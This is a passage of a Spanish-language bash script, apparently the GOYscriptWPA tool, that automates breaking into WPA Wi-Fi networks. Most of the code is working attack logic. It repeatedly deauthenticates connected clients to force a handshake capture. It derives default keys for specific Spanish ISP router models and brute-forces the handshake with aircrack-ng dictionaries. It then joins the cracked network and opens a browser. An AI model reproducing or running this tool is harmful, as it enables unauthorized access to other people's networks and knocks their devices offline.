echo "    Modo monitor....: $INTERFAZ_MONITOR"
echo "    MAC.............: $MAC_INTERFAZ"
echo "    Fabricante......: $FABRICANTE_INTERFAZ"
echo
echo -e "  "$subrayar"PUNTO DE ACCESO"$parpadeoOFF""$amarillo":"
echo "    Nombre..........: $NOMBRE_AP"
echo "    MAC.............: $MAC_AP"
echo "    Canal...........: $CANAL"
echo "    Fabricante......: $FABRICANTE_AP"
echo -e "$grisC"

rm -rf $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"* > /dev/null 2>&1
}

#COMPRUEBA SI ES UNA RED WLAN_xxxx o JAZZTEL_xxxx
function comprobar_wlan_jazztel_xxxx
{
WLAN=`echo $NOMBRE_AP | cut -c-5`
JAZZTEL=`echo $NOMBRE_AP | cut -c-8`
let NOMBRE_AP_LARGO=`echo -n $NOMBRE_AP | wc -c`
if [ "$WLAN" = "WLAN_" ] && [ $NOMBRE_AP_LARGO -eq 9 ]
then
	echo -e ""$verdeC"Red WLAN_xxxx detectada..."$grisC""
	$WLAN_JAZZTEL $NOMBRE_AP $MAC_AP > /dev/null
	if [ $? -eq 0 ]
	then
		$WLAN_JAZZTEL $NOMBRE_AP $MAC_AP > "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES) por_defecto.txt"
	else
		echo
		echo -e ""$rojoC"\"$NOMBRE_AP\" no tiene una contraseña por defecto conocida."$grisC""
		echo
	fi
else
	if [ "$JAZZTEL" = "JAZZTEL_" ] && [ $NOMBRE_AP_LARGO -eq 12 ]
	then
		echo -e ""$verdeC"Red JAZZTEL_xxxx detectada..."$grisC""
		$WLAN_JAZZTEL $NOMBRE_AP $MAC_AP > /dev/null
		if [ $? -eq 0 ]
		then
			$WLAN_JAZZTEL $NOMBRE_AP $MAC_AP > "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES) por_defecto.txt"
		else
			echo
			echo -e ""$rojoC"\"$NOMBRE_AP\" no tiene una contraseña por defecto conocida."$grisC""
			echo
		fi
	else
		echo -e ""$rojoC"No se conoce la contraseña por defecto de \"$NOMBRE_AP\"."$grisC""
		echo
	fi
fi
if [ -e "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES) por_defecto.txt" ]
then
	echo -e $verdeC"Contraseña por defecto guardada en:"
	echo -e $verdeC"\"./$CLAVES/$NOMBRE_AP ($MAC_GUIONES) por_defecto.txt\""
	echo -e $grisC
	echo -e $cyanC"Ahora capturaremos el handshake para comprobar"
	echo -e $cyanC"si la contraseña por defecto ha sido cambiada."
	echo -e $grisC
fi
}

#CAPTURAR TRÁFICO DE LA RED SELECCIONADA
function captura_de_paquetes
{
xterm $NORMAL $FUENTE $AIRODUMP_VENTANA -title "Capturando tráfico de \"$NOMBRE_AP\" #$CERO$NUM" -e $AIRODUMP --berlin 2 --bssid $MAC_AP -c $CANAL,$CANAL -w "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)" $INTERFAZ_MONITOR &
}

#SI EL TAMAÑO DEL ARCHIVO EN EL QUE GUARDAMOS LA CAPTURA ES MAYOR DEL TAMAÑO DETERMINADO, SE REINICIA
function controlar_tamano_captura
{
sleep 2
CAPTURANDO=`ps -A | grep airodump-ng | grep -v grep`
while [ ! "$CAPTURANDO" = "" ]
do
	SIZE_CAP=`ls -s "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)-$CERO$NUM.cap" | awk '{print $1}'`
	if [ $SIZE_CAP -gt $MAXIMO_PESO_DE_LA_CAPTURA ]
	then
		echo > "$CAPTURA/REINICIANDO.goy"
		echo -e $amarillo"\r\033[55C Reiniciando captura..."$grisC
		killall airodump-ng > /dev/null 2>&1
		sleep 2
		NUM=$((NUM+1))
		if [ $NUM -lt 10 ]
		then
			CERO="0"
		else
			CERO=""
		fi
		captura_de_paquetes &
		sleep 2
		rm -rf "$CAPTURA/REINICIANDO.goy"
	fi
	sleep 2
	CAPTURANDO=`ps -A | grep airodump-ng | grep -v grep`
done
}

function calcular_numero_archivo
{
NUM=`ls -1 $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-*.cap | wc -l`
if [ $NUM -lt 10 ]
then
	CERO="0"
else
	CERO=""
fi
}

#SI HAY CLIENTES CONECTADOS LOS EXPULSAMOS PARA FORZAR LA RECONEXION
function forzar_handshake
{
CLIENTE="" #INICIALIZAMOS LA VARIABLE EN LA QUE GUARDAREMOS LA MAC DEL CLIENTE
CAPTURANDO=`ps -A | grep airodump-ng | grep -v grep`
while [ ! "$CAPTURANDO" = "" ] || [ -e "$CAPTURA/REINICIANDO.goy" ] #MIENTRAS AIRODUMP SIGA ACTIVO SE BUSCARAN CLIENTES ASOCIADOS
do
	calcular_numero_archivo
	CLIENTES=`cat $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-$CERO$NUM.csv | grep -v WPA | grep $MAC_AP | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` #TODOS LOS CLIENTES DETECTADOS
	CUANTOS_CLIENTES=`echo $CLIENTES | wc -w`
	if [ "$CLIENTES" = "" ]
	then
		calcular_numero_archivo
		SIZE_CAP=`ls -s "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)-$CERO$NUM.cap" | awk '{print $1}'`
		if [ $SIZE_CAP -le 9 ] #PARA ALINEAR EL TAMAÑO EN KB A LA DERECHA
		then
			TAB="   "
		else
			if [ $SIZE_CAP -le 99 ]
			then
				TAB="  "
			else
				if [ $SIZE_CAP -le 999 ]
				then
					TAB=" "
				else
					TAB=""
				fi
			fi
		fi
		echo -e $cyan"\r${TAB}[ $SIZE_CAP KB ] Buscando clientes\c"
		CONT=1
		while [ $CONT -le 25 ]
		do
			echo -e ".\c"
			sleep 0.05
			CONT=$((CONT+1))
		done
		echo -en ""$cyan"\a\033[25D                         \033[25D"
	else
		CONT=1
		while [ $CONT -le $CUANTOS_CLIENTES ]
		do
			CLIENTE=`echo $CLIENTES | awk '{print $'$CONT'}'`
			CLIENTE_MEDIA_MAC=`echo -n $CLIENTE | cut -c-8`
			CLIENTE_FABRICANTE=`grep $CLIENTE_MEDIA_MAC $MACS | awk -F '#' '{print $2}'`
			echo -en $verdeC"\rExpulsando cliente $CLIENTE [$CLIENTE_FABRICANTE]... \033[K"
			echo -e $grisC
			xterm $BIEN $FUENTE $CLIENTE_VENTANA -title "ATAQUE -0 [Expulsando al cliente del AP]" -e $AIREPLAY -0 1 -a $MAC_AP -c $CLIENTE $INTERFAZ_MONITOR
			CONT=$((CONT+1))
		done
		CONT=$SEGUNDOS_ENTRE_EXPULSIONES
		while [ $CONT -ge 1 ]
		do
			calcular_numero_archivo
			DATAS=`cat ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-$CERO$NUM.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
			if [[ $DATAS -ne 0 ]]
			then
				HANDSHAKES=`aircrack-ng $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-$CERO$NUM.cap | grep $MAC_AP | $TAIL --bytes 14`
			fi
			SIZE_CAP=`ls -s "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)"-$CERO$NUM.cap | awk '{print $1}'`
			if [ $SIZE_CAP -le 9 ] #PARA ALINEAR EL TAMAÑO EN KB A LA DERECHA
			then
				TAB="   "
			else
				if [ $SIZE_CAP -le 99 ]
				then
					TAB="  "
				else
					if [ $SIZE_CAP -le 999 ]
					then
						TAB=" "
					else
						TAB=""
					fi
				fi
			fi
			if [ $CONT -eq 1 ]
			then
				echo -e $cyan"\r${TAB}[ $SIZE_CAP KB ] Esperando $CONT segundo...   $blanco $HANDSHAKES  \c"$grisC
			else
				if [ $CONT -lt 10 ]
				then
					echo -e $cyan"\r${TAB}[ $SIZE_CAP KB ] Esperando $CONT segundos...  $blanco $HANDSHAKES  \c"$grisC
				else
					echo -e $cyan"\r${TAB}[ $SIZE_CAP KB ] Esperando $CONT segundos... $blanco $HANDSHAKES  \c"$grisC
				fi
			fi
			if [ "$HANDSHAKES" = "(1 handshake)" ] #SI YA TENEMOS EL HANDSHAKE SALIMOS DEL BUCLE
			then
				echo -e $grisC
				break
			fi
			CAPTURANDO=`ps -A | grep airodump-ng | grep -v grep`
			sleep 1
			CONT=$((CONT-1))
		done
	fi
	calcular_numero_archivo
	DATAS=`cat ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-$CERO$NUM.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
	if [[ $DATAS -ne 0 ]]
	then
		HANDSHAKES=`aircrack-ng $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-$CERO$NUM.cap | grep $MAC_AP | $TAIL --bytes 14`
	fi
	if [ "$HANDSHAKES" = "(1 handshake)" ] #SI YA TENEMOS EL HANDSHAKE SALIMOS DEL BUCLE
	then
		echo -e $blanco"\n\n¡¡¡ Handshake conseguido !!!$grisC\n"
		$WPACLEAN "handshakes/$NOMBRE_AP ($MAC_GUIONES).cap" "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)-$CERO$NUM.cap" > /dev/null 2>&1
		rm -rf "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)*"  > /dev/null 2>&1
		break
	fi
	CAPTURANDO=`ps -A | grep airodump-ng | grep -v grep`
done
}

function esperar_csv
{
echo -e ""$cyan"Esperando a que se genere el archivo .CSV...\c"
CONTADOR=1
ls $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-01.csv > /dev/null 2>&1
while [ ! $? -eq 0 ]
do
	echo -e ""$cyan".\c"
	sleep 0.2
	CONTADOR=$((CONTADOR+1))
	if [ $CONTADOR -gt 15 ]
	then
		echo -en ""$cyan"\a\033[15D               \033[15D"
		CONTADOR=1
	fi
	ls $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-01.csv > /dev/null 2>&1
done
echo -e "$grisC\n"
}


#DESACTIVAR EL MODO MONITOR EN LA INTERFAZ VIRTUAL MON0
function desactivar_modo_monitor
{
echo -e ""$cyan"Desactivando modo monitor..."$grisC""
echo
$AIRMON stop $INTERFAZ > /dev/null 2>&1
$AIRMON stop mon0 > /dev/null 2>&1
}

function comprobar_ayuda
{
echo -e "$blanco"
echo "GOYscriptWPA $VERSION by GOYfilms"
echo
echo "Modo de uso: $0 [interfaz]"
echo
echo "OPCIONES:"
echo "    -l, --lista :Usar la lista de redes detectadas la última vez"
echo
echo "Ejemplos: $0"
echo "          $0 wlan1"
echo "          $0 wlan0 -l"
echo "          $0 --lista"
echo -e "$grisC"
exit 1
}

#MUESTRA LA CONTRASEÑA Y EL TIEMPO QUE HA TARDADO
function mostrar_clave
{
if [ -f "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
then
	CLAVE=`cat "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt"`
	clear
	echo
	echo -e $grisC"La contraseña para la red "$cyan"\"$NOMBRE_AP\""$grisC" es:"
	echo -e $verdeC"$CLAVE"
	echo
	echo -e ""$grisC"Se ha creado el archivo "$cyan"\""$NOMBRE_AP \($MAC_GUIONES\).txt"\""
	echo -e ""$grisC"en el directorio $blanco\"$CLAVES\"$grisC, el cual contiene la contraseña."
	echo
else
	if [ -f "./handshakes/$NOMBRE_AP ($MAC_GUIONES).cap" ] && [ "$HANDSHAKES" = "(1 handshake)" ]
	then
		echo -e $rojoC"No ha sido posible obtener la contraseña."
		echo
		echo -e $grisC"Se ha guardado el handshake en el directorio \"handshake\""
		echo -e $grisC"Puedes probar a pasar diccionarios manualmente. ¡Suerte!"
		echo
	else
		if [ "$CAP" = "" ]
		then
			echo -e $rojoC"Se ha cancelado el proceso."
			echo -e $grisC
		else
			echo -e $rojoC"No ha sido posible obtener la contraseña."
			echo
		fi
	fi
fi
}

function buscar_clave
{
DICCIONARIO=""
if [ "$NOMBRE_AP" = "Tele2" ] #CONTROLAMOS LAS REDES "Tele2"
then
	echo -e ""$verdeC"Red \"Tele2\" detectada."
	echo
	if [ -e "./dic/Tele2.dic" ]
	then
		DICCIONARIO="./dic/Tele2.dic"
	else
		echo -e $rojoC"El diccionario específico para esta red no está disponible."
		echo -e $verdeC"Sin embargo, se creará uno al vuelo."
		echo -e $grisC
		DIC_SCRIPT="./dic/./Tele2.sh"
		let LINEAS=20000000
	fi
else
	if [ "$MAC_AP_MITAD" = "00:19:15" ]
	then
		echo -e ""$verdeC"Red \"Tele2\" detectada. El nombre de la red se ha cambiado."
		echo
		if [ -e "./dic/Tele2.dic" ]
		then
			DICCIONARIO="./dic/Tele2.dic"
		else
			echo -e $rojoC"El diccionario específico para esta red no está disponible."
			echo -e $verdeC"Sin embargo, se creará uno al vuelo."
			echo -e $grisC
			DIC_SCRIPT="./dic/./Tele2.sh"
			let LINEAS=20000000
		fi
	fi
fi
NOMBRE_AP_ONO=`echo $NOMBRE_AP | cut -c-3`
if [ "$NOMBRE_AP_ONO" = "ONO" ] && [ $NOMBRE_AP_LARGO -eq 7 ] #CONTROLA LAS REDES "ONOxxxx"
then
	echo -e ""$verdeC"Red \"ONOxxxx\" detectada."
	echo
	echo -e ""$cyan"Creando diccionario..."
	echo
	$ONO4XX "$NOMBRE_AP" $MAC_AP wpa ./$CAPTURA/diccionario > /dev/null 2>&1
	DICCIONARIO="./$CAPTURA/diccionario"
	if [ ! -e  "$DICCIONARIO" ]
	then
		echo -e ""$rojoC"No se pudo crear un diccionario para la red \"$NOMBRE_AP\"."
		echo
		DICCIONARIO=""
	fi
fi
NOMBRE_AP_WIFI=`echo $NOMBRE_AP | cut -c-4`
if [ "$NOMBRE_AP_WIFI" = "WiFi" ] && [ $NOMBRE_AP_LARGO -eq 10 ] #CONTROLA LAS REDES "WiFixxxxxx"
then
	echo -e ""$verdeC"Red \"WiFixxxxxx\" detectada."
	echo
	echo -e ""$cyan"Creando diccionario..."
	echo
	$WLAN4XX "$NOMBRE_AP" $MAC_AP ./$CAPTURA/diccionario > /dev/null 2>&1
	DICCIONARIO="./$CAPTURA/diccionario"
	if [ ! -e  "$DICCIONARIO" ]
	then
		echo -e ""$rojoC"No se pudo crear un diccionario para la red \"$NOMBRE_AP\"."
		echo
		DICCIONARIO=""
	fi
fi
NOMBRE_AP_WLAN=`echo $NOMBRE_AP | cut -c-4`
if [ "$NOMBRE_AP_WLAN" = "WLAN" ] && [ $NOMBRE_AP_LARGO -eq 10 ] #CONTROLA LAS REDES "WLANxxxxxx"
then
	echo -e ""$verdeC"Red \"WLANxxxxxx\" detectada."
	echo
	echo -e ""$cyan"Creando diccionario..."
	echo
	$WLAN4XX "$NOMBRE_AP" $MAC_AP ./$CAPTURA/diccionario > /dev/null 2>&1
	DICCIONARIO="./$CAPTURA/diccionario"
	if [ ! -e  "$DICCIONARIO" ]
	then
		echo -e ""$rojoC"No se pudo crear un diccionario para la red \"$NOMBRE_AP\"."
		echo
		DICCIONARIO=""
	fi
fi
NOMBRE_AP_YACOM=`echo $NOMBRE_AP | cut -c-5`
if [ "$NOMBRE_AP_YACOM" = "YACOM" ] && [ $NOMBRE_AP_LARGO -eq 11 ] #CONTROLA LAS REDES "YACOMxxxxxx"
then
	echo -e ""$verdeC"Red \"YACOMxxxxxx\" detectada."
	echo
	echo -e ""$cyan"Creando diccionario..."
	echo
	$WLAN4XX "$NOMBRE_AP" $MAC_AP ./$CAPTURA/diccionario > /dev/null 2>&1
	DICCIONARIO="./$CAPTURA/diccionario"
	if [ ! -e  "$DICCIONARIO" ]
	then
		echo -e ""$rojoC"No se pudo crear un diccionario para la red \"$NOMBRE_AP\"."
		echo
		DICCIONARIO=""
	fi
fi
NOMBRE_AP_SPEEDTOUCH=`echo $NOMBRE_AP | cut -c-10`
OCTETOS_SPEEDTOUCH=`echo -n $NOMBRE_AP | $TAIL --bytes 6`
if [ "$NOMBRE_AP_SPEEDTOUCH" = "SpeedTouch" ] && [ $NOMBRE_AP_LARGO -eq 16 ] #CONTROLA LAS REDES "SpeedTouchxxxxxx"
then
	echo -e ""$verdeC"Red \"SpeedTouchxxxxxx\" detectada."
	echo
	echo -e ""$cyan"Creando diccionario..."
	echo
	$STKEYS -i "$OCTETOS_SPEEDTOUCH" -o ./$CAPTURA/diccionario > /dev/null 2>&1
	DICCIONARIO="./$CAPTURA/diccionario"
	if [ ! -e  "$DICCIONARIO" ]
	then
		echo -e ""$rojoC"No se pudo crear un diccionario para la red \"$NOMBRE_AP\"."
		echo
		DICCIONARIO=""
	fi
fi
if [ "$DIC_SCRIPT" != "" ] #SI SE VA A BUSCAR LA CONTRASEÑA CON UN SCRIPT
then
	CLAVES_CON_FORMATO=`separador_de_miles $LINEAS`
	echo -en ""$cyanC"Buscando contraseña al vuelo ($CLAVES_CON_FORMATO contraseñas)... $grisC"
	if [ "$CAP" = "" ]
	then
 		xterm $NORMAL $FUENTE $AIRCRACK_VENTANA -title "Probando contraseñas al vuelo" -e "$DICCIONARIO_AL_VUELO" "$DIC_SCRIPT" "$AIRCRACK" "./handshakes/$NOMBRE_AP ($MAC_GUIONES).cap" "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" "$MAC_AP"
	else
 		xterm $NORMAL $FUENTE $AIRCRACK_VENTANA -title "Probando contraseñas al vuelo" -e "$DICCIONARIO_AL_VUELO" "$DIC_SCRIPT" "$AIRCRACK" "$CAP" "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" "$MAC_AP"
	fi
	EXISTE=`find "$CLAVES" | grep "$NOMBRE_AP ($MAC_GUIONES).txt"`
	if [ "$EXISTE" != "" ]
	then
		echo -e $verdeC"¡¡¡ ENCONTRADA !!!"$grisC
		sleep 2
	else
		echo -e $rojoC"NO ENCONTRADA"$grisC
	fi
	echo -e $grisC
fi
if [ "$DICCIONARIO" != "" ] #SI SE HA PODIDO CREAR UN DICCIONARIO, SE PROCEDE A UTILIZARLO...
then
	LINEAS=`cat "$DICCIONARIO" | wc -l`
	CLAVES_CON_FORMATO=`separador_de_miles $LINEAS`
	echo -e ""$cyanC"Buscando con el diccionario $blanco\"$DICCIONARIO\"$cyanC ($CLAVES_CON_FORMATO contraseñas)..."
	echo
	if [ "$CAP" = "" ]
	then
		xterm $NORMAL $FUENTE $AIRCRACK_VENTANA -title "Probando contraseñas de \"$DICCIONARIO\"" -e $AIRCRACK -0 -w "$DICCIONARIO" "./handshakes/$NOMBRE_AP ($MAC_GUIONES).cap" -l "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt"
	else
		xterm $NORMAL $FUENTE $AIRCRACK_VENTANA -title "Probando contraseñas de \"$DICCIONARIO\"" -e $AIRCRACK -0 -w "$DICCIONARIO" "$CAP" -l "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt"
	fi
fi
if [ -e "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES) por_defecto.txt" ] #SI SE HA GUARDADO LA CONTRASEÑA POR DEFECTO COMPROBAMOS SI SE HA CAMBIADO
then
	DICCIONARIO="./$CLAVES/$NOMBRE_AP ($MAC_GUIONES) por_defecto.txt"
	echo -e $cyanC"Vamos a comprobar si la contraseña por defecto ha sido cambiada..."
	echo -e $grisC
	xterm $NORMAL $FUENTE $AIRCRACK_VENTANA -title "Probando contraseña por defecto de \"$NOMBRE_AP\"" -e $AIRCRACK -0 -w "$DICCIONARIO" "./handshakes/$NOMBRE_AP ($MAC_GUIONES).cap" -l "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt"
	if [ -e "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
	then
		echo -e $verdeC"¡CONFIRMADO! La contraseña por defecto no ha sido cambiada."
		echo -e $grisC
		rm -rf "$DICCIONARIO" > /dev/null 2>&1
		sleep 3
	else
		echo -e $rojoC"La contraseña por defecto ha sido cambiada."
		echo -e $grisC
	fi
fi
if [ ! -e "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ] # SI LLEGADOS AQUÍ NO SE HA OBTENIDO LA CONTRASEÑA, SE PROCEDE A PASAR DICCIONARIOS GENÉRICOS
then
	DICCIONARIOS=`find ./dic -maxdepth 1 | grep '/generico.' | grep -e '.dic$' -e '.sh$' | sort`
	DICCIONARIOS_SIN_DIRECTORIO=`echo "$DICCIONARIOS" | sed 's[./dic/[[g'`
	let CUANTOS_HAY=`find ./dic -maxdepth 1 | grep '/generico.' | grep -e '.dic$' -e '.sh$' | wc -l`
	if [ $CUANTOS_HAY -eq 0 ]
	then
		echo -e $rojoC"No se ha encontrado ningún diccionario genérico."
		echo -e $grisC
		echo -e $cyanC"Los diccionarios genéricos deben estar en la carpeta \"dic\""
		echo -e $cyanC"con el siguiente nombre: \"generico.<NOMBRE>.dic\""
		echo -e $cyanC"Ejemplo: \"generico.numeros.dic\""
		echo -e $grisC
	else
		if [ $CUANTOS_HAY -eq 1 ]
		then
			echo -e $cyanC"Se ha encontrado $blanco$CUANTOS_HAY$cyanC diccionario genérico:"
			echo -e $grisC"$DICCIONARIOS_SIN_DIRECTORIO"
		else
			echo -e $cyanC"Se han encontrado $blanco$CUANTOS_HAY$cyanC diccionarios genéricos:"
			echo -e $grisC"$DICCIONARIOS_SIN_DIRECTORIO"
		fi
		let CONT=1
		while [ $CONT -le $CUANTOS_HAY ]
		do
			DICCIONARIO=`echo "$DICCIONARIOS" | sed -n ${CONT}p`
			NOMBRE_DIC=`echo "$DICCIONARIO" | awk -F '/' '{print $3}' | sed 's/generico.//g'`
			AL_VUELO=$(echo "$DICCIONARIO" | grep '.sh$')
			if [ "$AL_VUELO" != "" ]
			then
				let LINEAS=$(sed -n 2p "$DICCIONARIO" | awk -F '=' '{print $2}')
			else
				let LINEAS=`cat "$DICCIONARIO" | wc -l`
			fi
			CLAVES_CON_FORMATO=`separador_de_miles $LINEAS`
			echo
			echo -e $cyanC"Buscando con el diccionario nº $CONT:"
			echo -en "\"$blanco$NOMBRE_DIC$cyanC\" ($CLAVES_CON_FORMATO contraseñas)... $grisC"
			if [ "$AL_VUELO" != "" ]
			then
				xterm $NORMAL $FUENTE $AIRCRACK_VENTANA -title "Probando contraseñas al vuelo de \"$DICCIONARIO\"" -e "$DICCIONARIO_AL_VUELO" "$DICCIONARIO" "$AIRCRACK" "./handshakes/$NOMBRE_AP ($MAC_GUIONES).cap" "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" "$MAC_AP"
			else
				xterm $NORMAL $FUENTE $AIRCRACK_VENTANA -title "Probando contraseñas de \"$DICCIONARIO\"" -e $AIRCRACK -0 -w "$DICCIONARIO" "./handshakes/$NOMBRE_AP ($MAC_GUIONES).cap" -l "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt"
			fi
			EXISTE=`find "$CLAVES" | grep "$NOMBRE_AP ($MAC_GUIONES).txt"`
			if [ "$EXISTE" != "" ]
			then
				echo -e $verdeC"¡¡¡ ENCONTRADA !!!"$grisC
				sleep 2
				break #SI CON EL DICCIONARIO ACTUAL SE ENCUENTRA LA CONTRASEÑA SALE DEL BUCLE
			else
				echo -e $rojoC"NO ENCONTRADA"$grisC
			fi
			let CONT=$CONT+1
		done
		echo
		echo
	fi
fi
}

#ESPERA A QUE SE PULSE UNA TECLA
function pulsar_una_tecla
{
echo
echo -e $blanco"$1"$grisC" \c"
read -n 1 TECLA
echo
echo
if [ "$1" = "Pulsa una tecla para salir..." ]
then
	exit 1
fi
}

function conectar_internet
{
echo -en ""$cyan"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: ""$amarillo\c"
read -n 1 RESPUESTA
while [ "$RESPUESTA" != "s" ] && [ "$RESPUESTA" != "n" ] && [ "$RESPUESTA" != "S" ] && [ "$RESPUESTA" != "N" ]
do
	echo -en ""$rojoC"  Respuesta no válida"
	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: "$amarillo\c"
	read -n 1 RESPUESTA
done
echo -en "                     " # BORRA EL MENSAJE DE "Respuesta no válida"
if [ "$RESPUESTA" = "s" ] || [ "$RESPUESTA" = "S" ]
then
	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: $amarillo"SÍ"
	echo -e "$cyan\n"
	echo -e "Configurando la tarjeta WiFi para conectarse a la red \"$NOMBRE_AP\"..."$grisC""
	echo
	killall -q dhcpcd dhclient udhcpc wpa_supplicant > /dev/null 2>&1
	desactivar_todos_monX
	LINEAS_CLAVE=$(cat "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" | wc -l)
	if [ $LINEAS_CLAVE -eq 2 ] #SI EL TXT QUE CONTIENE LA CONTRASEÑA TIENE 2 LINEAS ES PORQUE SE DESENCRIPTÓ CON goyscriptWPS sinó con goyscriptWPA
	then
		CLAVE_WPA=$(cat "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" | sed -n 2p | awk -F "'" '{print $2}')
	else
		CLAVE_WPA=$(cat "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt")
	fi
	$WPA_PSK_RAW "$NOMBRE_AP" "$CLAVE_WPA" > "./$CAPTURA/internet.conf"
	wpa_supplicant -B -D wext -i $INTERFAZ -c "./$CAPTURA/internet.conf"
	sleep 1
	echo -e ""$cyan"Iniciando servidor DHCP. Puede llevar un tiempo, ten paciencia..."$grisC"\n"
	dhclient -r
	dhclient $INTERFAZ
	if [ $? != 0 ] #SI NO VA A LA SEGUNDA NO CREO QUE VAYA BIEN LA COSA :D
	then
		echo -e "$rojoC"
		echo "No ha sido posible realizar la conexión."
		echo "Probablemente estás demasiado lejos del punto de acceso."
		echo -e "$grisC"
	else
		echo -e "$cyan"
		echo "Configuración finalizada. Comprueba si tienes conexión."
		echo -e "$grisC"
		NAVEGADOR=`which firefox`
		if [ "$NAVEGADOR" != "" ]
		then
			$NAVEGADOR www.google.es & > /dev/null 2>&1
			echo -e "$verdeC"
			echo "Abriendo \"Firefox\"..."
			echo -e "$grisC"
		else
			NAVEGADOR=`which konqueror`
			if [ "$NAVEGADOR" != "" ]
			then
				$NAVEGADOR www.google.es & > /dev/null 2>&1
				echo -e "$verdeC"
				echo "Abriendo \"Konqueror\"..."
				echo -e "$grisC"
			else
				echo -e "$rojoC"
				echo "No tienes instalado \"Firefox\" ni \"Konqueror\"."
				echo "Si tienes algun otro navegador ejecútalo."
			fi
		fi
		pulsar_una_tecla "Pulsa una tecla para desconectarte de $cyanC\"$NOMBRE_AP\"$blanco..."
		matar_procesos "Desconectando de $blanco\"$NOMBRE_AP\"$cyanC..."
	fi
else
	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: $amarillo"NO"
fi
echo -e "$grisC"
echo
}

# FUNCIÓN QUE DADO UN NÚMERO, LO ESCRIBE CON SEPARADOR DE MILES
# EJEMPLO: NUMERO DADO=1000000, ESCRIBE=1.000.000
function separador_de_miles
{
NUMERO="$1"
let CIFRAS=`echo -n "$NUMERO" | wc -c`
let X=1
while [ $CIFRAS -gt 3 ]
do
	TRIO[$X]=`echo -n $NUMERO | $TAIL --bytes 3`
	let QUEDAN=$CIFRAS-3
	NUMERO=`echo -n $NUMERO | $HEAD --bytes $QUEDAN`
	let CIFRAS=`echo -n "$NUMERO" | wc -c`
	let X=$X+1
done
let X=$X-1
echo -en $NUMERO | $TAIL --bytes 3
while [ $X -ne 0 ]
do
	echo -en ".${TRIO[$X]}"
	let X=$X-1
done
}

function comprobar_distribucion
{
DISTRIBUCION=$(./software/./distro_linux.sh)
case "$DISTRIBUCION" in
"<Desconocida>")
	echo -e $rojoC"Distribución de Linux desconocida$grisC"
	echo -e $grisC;;
*)
	echo -e $verdeC"Distribución de linux detectada: $blanco$DISTRIBUCION"
	echo -e $grisC;;
esac
}


##### PROGRAMA PRINCIPAL #####

if [ "$1" == "--help" ] || [ "$1" == "--ayuda" ] || [ "$1" == "/?" ]
then
	comprobar_ayuda
fi

matar_procesos " Iniciando..."

ln -s /lib/libssl.so.0.9.8 /lib/libssl.so.1 > /dev/null 2>&1 #librerias enlazadas para compatibilidad entre distros
ln -s /lib/libcrypto.so.0.9.8 /lib/libcrypto.so.1 > /dev/null 2>&1
ln -s /usr/lib/libpcap.so.1.0.0 /usr/lib/libpcap.so.1 > /dev/null 2>&1

version

comprobar_distribucion

if [[ -e "/sys/class/net/$1/device/driver" ]]  #Para controlar si existe la interfaz pasada como parametro.
then                                           #Si no existe, muestra las que hay para que seleccionemos una
	INTERFAZ=$1
else
	seleccionar_tarjeta
fi

borrar_sesiones_anteriores

mostrar_resolucion_de_pantalla

iniciar_tarjeta

activar_modo_monitor

LISTA=`echo "$*" | grep -w -e "-l" -e "--lista"` # PARA CONTROLAR SI SE USÓ EL PARÁMETRO INDICADO
if [ "$LISTA" != "" ] && [ -e "./$CAPTURA/redes_wpa.goy" ]
then
	echo -e $cyanC"Se usará la lista de redes detectadas anteriormente."$grisC
	echo
	mv "$CAPTURA/anteriorCSV.wifis-wpa-clientes" "$CAPTURA/clientes_wpa.csv" > /dev/null 2>&1
	sleep 1
else
	buscar_redes
fi

while true
do
	seleccionar_red

	INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
	if [ "$INTERFACES_MONITOR" = "" ] #SE ACTIVA EL MODO MONITOR SI SE DESACTIVÓ PREVIAMENTE PARA CONECTARSE A INTERNET
	then
		echo -e $grisC
		activar_modo_monitor
	fi

	hora_inicio

	mostrar_datos_seleccionados

	comprobar_wlan_jazztel_xxxx

	CAP=`find handshakes | grep "$NOMBRE_AP ($MAC_GUIONES).cap"`

	if [ -f "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
	then
		echo
